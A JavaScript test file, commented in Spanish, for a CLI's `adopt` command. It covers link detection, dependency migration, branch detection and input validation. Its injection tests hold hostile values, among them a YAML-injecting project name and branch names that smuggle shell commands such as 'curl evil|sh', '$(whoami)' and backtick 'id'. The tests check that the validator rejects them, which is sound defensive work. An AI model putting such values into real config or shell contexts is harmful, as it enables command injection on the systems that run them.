// ---------------------------------------------------------------------------
// P13 (ADR 0007, decision 9 del cierre): `sdlc adopt` reemplaza `npm link`
// para el consumidor maduro (el repo padre) que no quiere el scaffold
// completo de `sdlc install`. Aditivo puro: nunca sobreescribe lo que ya
// existe. `detectCliLinked()` es el mismo chequeo que `quality-verify.yml`
// hace en bash, ahora una funcion real y testeable.
// ---------------------------------------------------------------------------
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import YAML from "yaml";
import { commandAdopt, detectCliLinked } from "../src/adopt.js";
import { validateConfigShape } from "../src/config-validator.js";

const pathExistsSync = (candidate) => fs.existsSync(candidate);

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const cli = path.join(repoRoot, "bin", "sdlc.js");
const PACKAGE_NAME = "sistema-multiagente-sdlc";

function fixturePackage(dir, version) {
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, "package.json"), JSON.stringify({ name: PACKAGE_NAME, version }, null, 2), "utf8");
}

// --- unidad: detectCliLinked debe resolver desde el TARGET, no desde el
// modulo del framework (P13: resolver desde el framework es ciego
// exactamente en el escenario de `npm link`, que es el que este chequeo
// existe para detectar). ----------------------------------------------
{
  // Sin la dependencia declarada en absoluto: declared debe ser false, nunca
  // un `linked` inventado.
  const noDepTarget = fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-detect-nodep-"));
  const undeclaredResult = detectCliLinked(noDepTarget);
  assert.equal(undeclaredResult.declared, false);
  assert.equal(undeclaredResult.linked, null);

  // DECLARADA PERO NO INSTALADA. Deriva `declared` de require.resolve
  // confundia este caso con "nunca se declaro": dos estados distintos
  // colapsados en una sola senal, que es lo que este framework rechaza en el
  // codigo del consumidor. `declared` sale del package.json; `installed` dice
  // si ademas se puede resolver.
  const declaredNotInstalled = fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-detect-noinstall-"));
  fs.writeFileSync(
    path.join(declaredNotInstalled, "package.json"),
    JSON.stringify({ name: "declara-sin-instalar", devDependencies: { [PACKAGE_NAME]: "^1.8.0" } }, null, 2),
    "utf8"
  );
  const pendiente = detectCliLinked(declaredNotInstalled);
  assert.equal(pendiente.declared, true, "el package.json la declara: decir lo contrario es reportar mal el estado real");
  assert.equal(pendiente.installed, false);
  assert.equal(pendiente.linked, null, "no se puede afirmar 'link' sobre algo que no existe en disco");

  // PNPM. Node resuelve por realpath, y con pnpm el paquete real vive en el
  // store virtual (node_modules/.pnpm/<pkg>@<ver>/node_modules/<pkg>) mientras
  // node_modules/<pkg> es un enlace. Anclar al directorio exacto marcaba como
  // `linked` una instalacion pnpm normal, y el repo padre usa pnpm: `doctor` le
  // avisaba de un link inexistente diciendo que "CI lo rechaza", cuando el bash
  // de quality-verify.yml acepta cualquier ruta bajo node_modules.
  const pnpmTarget = fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-detect-pnpm-"));
  fs.writeFileSync(
    path.join(pnpmTarget, "package.json"),
    JSON.stringify({ name: "consumidor-pnpm", devDependencies: { [PACKAGE_NAME]: "^1.8.0" } }, null, 2),
    "utf8"
  );
  const storeDir = path.join(pnpmTarget, "node_modules", ".pnpm", `${PACKAGE_NAME}@1.8.0`, "node_modules", PACKAGE_NAME);
  fixturePackage(storeDir, "1.8.0");
  fs.symlinkSync(storeDir, path.join(pnpmTarget, "node_modules", PACKAGE_NAME), "junction");
  const pnpmResult = detectCliLinked(pnpmTarget);
  assert.equal(pnpmResult.declared, true);
  assert.equal(pnpmResult.installed, true);
  assert.equal(
    pnpmResult.linked,
    false,
    "una instalacion pnpm resuelve al store virtual pero sigue estando dentro de node_modules: no es un link"
  );

  // Paquete real instalado bajo target/node_modules (npm/yarn planos, no
  // symlink): declared true, linked false.
  const installedTarget = fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-detect-installed-"));
  fs.writeFileSync(
    path.join(installedTarget, "package.json"),
    JSON.stringify({ name: "consumidor-npm", devDependencies: { [PACKAGE_NAME]: "^1.8.0" } }, null, 2),
    "utf8"
  );
  fixturePackage(path.join(installedTarget, "node_modules", PACKAGE_NAME), "1.8.0");
  const installedResult = detectCliLinked(installedTarget);
  assert.equal(installedResult.declared, true);
  assert.equal(installedResult.installed, true);
  assert.equal(installedResult.linked, false);

  // Escenario `npm link`: target/node_modules/<paquete> es un symlink hacia
  // un working tree del framework fuera de node_modules. Este es exactamente
  // el caso que P13 rompia: resolver desde import.meta.url (el propio modulo
  // del framework, que no se depende a si mismo) revienta y cae al catch,
  // reportando declared:false en vez de declared:true, linked:true.
  const linkedTarget = fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-detect-linked-"));
  fs.writeFileSync(
    path.join(linkedTarget, "package.json"),
    JSON.stringify({ name: "consumidor-linkeado", devDependencies: { [PACKAGE_NAME]: "^1.8.0" } }, null, 2),
    "utf8"
  );
  const externalFrameworkDir = fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-detect-external-fw-"));
  fixturePackage(externalFrameworkDir, "1.8.0-dev");
  fs.mkdirSync(path.join(linkedTarget, "node_modules"), { recursive: true });
  fs.symlinkSync(externalFrameworkDir, path.join(linkedTarget, "node_modules", PACKAGE_NAME), "junction");
  const linkedResult = detectCliLinked(linkedTarget);
  assert.equal(linkedResult.declared, true, "npm link debe seguir resolviendo la dependencia, no reportar declared:false");
  assert.equal(linkedResult.installed, true);
  assert.equal(
    linkedResult.linked,
    true,
    "el enlace resuelve a un working tree FUERA del arbol node_modules del target: eso si es un link y CI lo rechaza"
  );
}

console.log("adopt detectCliLinked unit: PASS");

// --- E2E: repo maduro, sin package.json -> error claro ----------------------
const noPackageJson = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-adopt-")), "sin-package-json");
fs.mkdirSync(noPackageJson, { recursive: true });
const noPackageJsonResult = commandAdopt({ target: noPackageJson });
assert.equal(noPackageJsonResult.exitCode, 1);
assert.match(noPackageJsonResult.payload.message, /package\.json/);

// --- E2E: repo maduro real, sin config previo -------------------------------
const target = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-adopt-")), "padre");
fs.mkdirSync(target, { recursive: true });
fs.writeFileSync(
  path.join(target, "package.json"),
  JSON.stringify({ name: "repo-maduro-demo", version: "1.0.0" }, null, 2),
  "utf8"
);
execFileSync("git", ["init", "--quiet"], { cwd: target });
execFileSync("git", ["config", "user.email", "test@example.com"], { cwd: target });
execFileSync("git", ["config", "user.name", "Test"], { cwd: target });
execFileSync("git", ["add", "."], { cwd: target });
execFileSync("git", ["commit", "--quiet", "-m", "base"], { cwd: target });

const adopted = commandAdopt({ target, "project-name": "RepoMaduroDemo" });
assert.equal(adopted.exitCode, 0, JSON.stringify(adopted.payload));
assert.ok(adopted.payload.created.some((entry) => entry.includes("package.json")));
assert.ok(adopted.payload.created.includes(".sdlc/config.json"));
assert.ok(adopted.payload.created.includes("quality-contract.yaml"));
assert.ok(adopted.payload.created.includes("phase-contract.yaml"));

const packageJsonAfter = JSON.parse(fs.readFileSync(path.join(target, "package.json"), "utf8"));
assert.ok(packageJsonAfter.devDependencies["sistema-multiagente-sdlc"], "debe agregar la devDependency, nunca un link");

const config = JSON.parse(fs.readFileSync(path.join(target, ".sdlc", "config.json"), "utf8"));
assert.equal(config.mode, "legacy");
assert.deepEqual(config.surfaces, [], "adopt no inventa superficies de ejemplo sobre un repo maduro");
assert.equal(config.project.name, "RepoMaduroDemo");

// El config que adopt escribe debe pasar el propio validador del framework
// (P13: `governance.maintainers: []` violaba minItems:1 del schema -- adopt
// generaba un archivo que `sdlc doctor` reportaria como invalido).
assert.deepEqual(validateConfigShape(config), [], "el config generado por adopt debe ser valido segun sdlc.config.schema.json");

const contract = YAML.parse(fs.readFileSync(path.join(target, "quality-contract.yaml"), "utf8"));
assert.deepEqual(contract.surfaces, [], "sin superficies declaradas todavia, el contrato lo dice explicitamente");

console.log("adopt e2e (repo nuevo): PASS");

// --- E2E: file:/link: previo se migra, no se deja pasar como "ya declarada"
// (decision 9 abandona npm link; una declaracion file:/link: es el mismo
// problema con otro nombre) -------------------------------------------------
const linkedDepTarget = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-adopt-")), "consumidor-linkeado");
fs.mkdirSync(linkedDepTarget, { recursive: true });
fs.writeFileSync(
  path.join(linkedDepTarget, "package.json"),
  JSON.stringify({ name: "consumidor-linkeado", dependencies: { "sistema-multiagente-sdlc": "file:../../sistema-multiagente-sdlc" } }, null, 2),
  "utf8"
);
const migrated = commandAdopt({ target: linkedDepTarget });
assert.equal(migrated.exitCode, 0, JSON.stringify(migrated.payload));
assert.ok(
  migrated.payload.created.some((entry) => entry.startsWith("package.json") && entry.includes("file:")),
  "debe reportar la migracion del file:, no un skip silencioso"
);
const migratedPackageJson = JSON.parse(fs.readFileSync(path.join(linkedDepTarget, "package.json"), "utf8"));
assert.ok(!migratedPackageJson.dependencies?.["sistema-multiagente-sdlc"], "el file: en dependencies debe quedar eliminado");
assert.match(migratedPackageJson.devDependencies["sistema-multiagente-sdlc"], /^\^/, "debe quedar una version semver real, no file:/link:");

console.log("adopt e2e (migracion file:): PASS");

// --- rama de integracion: elegir en silencio entre candidatas ---------------
// `gitFlow.integrationBranch` decide contra que BASE compara el guard de
// frontera y la ancestria de change-close. En un repo gitflow `origin/HEAD`
// suele apuntar a `main` mientras la integracion real ocurre en `develop`
// (es el caso del repo padre), asi que la eleccion tiene que verse.
const gitflowTarget = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-adopt-gitflow-")), "consumidor");
fs.mkdirSync(gitflowTarget, { recursive: true });
fs.writeFileSync(path.join(gitflowTarget, "package.json"), JSON.stringify({ name: "gitflow-demo" }, null, 2), "utf8");
execFileSync("git", ["init", "--quiet"], { cwd: gitflowTarget });
execFileSync("git", ["config", "user.email", "test@example.com"], { cwd: gitflowTarget });
execFileSync("git", ["config", "user.name", "Test"], { cwd: gitflowTarget });
execFileSync("git", ["add", "-A"], { cwd: gitflowTarget });
execFileSync("git", ["commit", "--quiet", "-m", "base"], { cwd: gitflowTarget });
execFileSync("git", ["update-ref", "refs/remotes/origin/main", "HEAD"], { cwd: gitflowTarget });
execFileSync("git", ["update-ref", "refs/remotes/origin/develop", "HEAD"], { cwd: gitflowTarget });
execFileSync("git", ["symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/main"], { cwd: gitflowTarget });

const gitflowResult = commandAdopt({ target: gitflowTarget });
assert.equal(gitflowResult.exitCode, 0);
assert.equal(gitflowResult.payload.gitFlow.integrationBranch, "main", "origin/HEAD manda cuando existe: es lo que el repo declara");
assert.equal(gitflowResult.payload.gitFlow.detectedFrom, "origin/HEAD");
assert.deepEqual(
  gitflowResult.payload.gitFlow.alternatives,
  ["develop"],
  "si habia otra candidata hay que decirlo: una base equivocada no falla de forma visible, produce un diff contra otra cosa"
);
assert.match(gitflowResult.payload.gitFlow.hint, /origin\/develop/);

// Rutas siempre en POSIX: `path.join` mezclaba `schemas\phase-evidence...` con
// rutas de barra normal dentro de la misma lista JSON en Windows.
const todasLasRutas = [...gitflowResult.payload.created, ...gitflowResult.payload.skipped];
assert.ok(
  todasLasRutas.every((entry) => !entry.includes("\\")),
  `el payload no puede mezclar separadores: ${JSON.stringify(todasLasRutas)}`
);
assert.ok(todasLasRutas.some((entry) => entry.startsWith("schemas/phase-evidence.schema.json")));

console.log("adopt e2e (rama de integracion y rutas POSIX): PASS");

// --- INYECCION POR LA PUERTA DE AL LADO -------------------------------------
// El mismo agujero que se cerro en `commandUpgrade` seguia abierto aqui:
// `--project-name` (o `package.json.name`) llegaba crudo hasta `interpolate()`,
// que sustituye texto SIN escapar, y de ahi a quality-contract.yaml -- un
// archivo que el guard de frontera SI protege, alcanzado desde una entrada que
// nadie validaba. Reproducido antes del fix: el contrato salia con
// `enforcement: block` inyectado como clave real y exit 0.
const injectionTarget = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-adopt-inject-")), "victima");
fs.mkdirSync(injectionTarget, { recursive: true });
fs.writeFileSync(path.join(injectionTarget, "package.json"), JSON.stringify({ name: "demo" }, null, 2), "utf8");

const injected = commandAdopt({ target: injectionTarget, "project-name": "MiProyecto\nenforcement: block\n#" });
assert.notEqual(injected.exitCode, 0, "un nombre con salto de linea no puede terminar en un contrato generado");
assert.equal(injected.payload.code, "adopt-config-invalid");
assert.ok(injected.payload.errors.some((e) => e.includes("/project/name")));
assert.ok(
  !pathExistsSync(path.join(injectionTarget, "quality-contract.yaml")),
  "el rechazo tiene que ocurrir ANTES de generar nada, no despues"
);
assert.ok(!pathExistsSync(path.join(injectionTarget, ".sdlc", "config.json")));

// Los campos que acaban dentro de una asignacion de shell en el workflow
// (`BASE="origin/{{gitFlow.integrationBranch}}"`) no son texto libre: prohibir
// solo CR/LF filtraba una carga util, no la causa. Una comilla basta.
{
  const base = {
    schemaVersion: 1,
    frameworkVersion: "1.8.0",
    project: { name: "demo", slug: "demo" },
    mode: "legacy",
    surfaces: [],
    openspec: { profile: "minimal" }
  };
  const legitimas = ["develop", "main", "release/1.2.x", "feature/algo-1"];
  for (const branch of legitimas) {
    assert.deepEqual(
      validateConfigShape({ ...base, gitFlow: { integrationBranch: branch, stableBranch: "main" } }),
      [],
      `'${branch}' es un nombre de rama legitimo y no puede rechazarse`
    );
  }
  const peligrosas = ['main";curl evil|sh;echo "', "rama con espacios", "a$(whoami)", "x`id`", "a;b"];
  for (const branch of peligrosas) {
    assert.ok(
      validateConfigShape({ ...base, gitFlow: { integrationBranch: branch, stableBranch: "main" } }).length > 0,
      `'${branch}' llega a una asignacion de shell del workflow generado: tiene que rechazarse`
    );
  }
}

console.log("adopt inyeccion por project-name y gitFlow: PASS");

// --- E2E: aditivo puro -- correrlo de nuevo no pisa lo que ya existe -------
fs.writeFileSync(
  path.join(target, "quality-contract.yaml"),
  "version: 1\nenforcement: observe\ntiers: {}\nsurfaces: [{ id: \"checkout-core\", path: \"packages/checkout-core\", tier: \"core\", money_path: true, has_ui: false }]\nprobes: []\ngates: []\n",
  "utf8"
);
const handEdited = fs.readFileSync(path.join(target, "quality-contract.yaml"), "utf8");

const secondRun = commandAdopt({ target });
assert.equal(secondRun.exitCode, 0);
assert.ok(secondRun.payload.skipped.some((entry) => entry.includes("quality-contract.yaml")));
assert.ok(secondRun.payload.skipped.some((entry) => entry.includes(".sdlc/config.json")));
assert.equal(fs.readFileSync(path.join(target, "quality-contract.yaml"), "utf8"), handEdited, "adopt jamas pisa un archivo que ya existe");

console.log("adopt e2e (idempotente): PASS");

// --- CLI: sdlc adopt de punta a punta ---------------------------------------
const cliTarget = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-adopt-cli-")), "consumidor");
fs.mkdirSync(cliTarget, { recursive: true });
fs.writeFileSync(path.join(cliTarget, "package.json"), JSON.stringify({ name: "demo" }, null, 2), "utf8");
const cliRun = spawnSync("node", [cli, "adopt", "--target", cliTarget, "--json"], { cwd: repoRoot, encoding: "utf8" });
assert.equal(cliRun.status, 0, cliRun.stdout + cliRun.stderr);
const cliPayload = JSON.parse(cliRun.stdout);
assert.equal(cliPayload.status, "ok");
assert.ok(fs.existsSync(path.join(cliTarget, "quality-contract.yaml")));

console.log("adopt cli e2e: PASS");

// --- repo de raiz plana, sin package.json ----------------------------------
// Una extension de navegador sin build no podia adoptar el framework y el
// mensaje solo decia que no. Ahora hay un camino explicito, y sin la bandera el
// error dice exactamente que ejecutar.
{
  const plano = fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-adopt-plano-"));
  fs.writeFileSync(path.join(plano, "content.js"), "// extension\n", "utf8");

  const sinBandera = commandAdopt({ target: plano });
  assert.equal(sinBandera.payload.status, "error");
  assert.equal(sinBandera.payload.code, "adopt-package-json-missing");
  assert.match(sinBandera.payload.message, /--bootstrap-package-json/, "el error tiene que decir el comando exacto");
  assert.equal(fs.existsSync(path.join(plano, "package.json")), false, "sin la bandera no se escribe nada");

  const conBandera = commandAdopt({ target: plano, "bootstrap-package-json": true, "project-name": "Mi Extension" });
  assert.equal(conBandera.payload.status, "ok", JSON.stringify(conBandera.payload));
  const bootstrapped = JSON.parse(fs.readFileSync(path.join(plano, "package.json"), "utf8"));
  assert.equal(bootstrapped.name, "mi-extension");
  assert.equal(bootstrapped.private, true);
  assert.ok(bootstrapped.devDependencies["sistema-multiagente-sdlc"], "la devDependency se agrega en la misma pasada");
  assert.ok(fs.existsSync(path.join(plano, "quality-contract.yaml")));
}

console.log("adopt sin package.json previo: PASS");
